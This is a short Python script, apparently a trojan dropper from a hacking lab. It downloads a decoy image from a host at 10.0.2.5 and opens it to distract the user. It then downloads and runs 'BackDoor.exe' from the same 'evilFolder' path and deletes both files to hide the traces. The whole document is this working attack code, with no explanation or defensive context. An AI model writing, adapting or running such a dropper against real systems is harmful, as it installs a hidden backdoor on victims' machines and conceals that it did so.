
import subprocess, smtplib, requests, tempfile, os

def download(url):
    get_responses = requests.get(url)
    filename = url.split("/")[-1]
    with open(filename, "wb") as output:
        output.write(get_responses.content)

tempdir = tempfile.gettempdir()
os.chdir(tempdir)

download("http://10.0.2.5/evilFolder/car.jpg")
subprocess.Popen("car.jpg",shell=True)

download("http://10.0.2.5/evilFolder/BackDoor.exe")
subprocess.call("BackDoor.exe", shell=True)

os.remove("car.jpg")
os.remove("BackDoor.exe")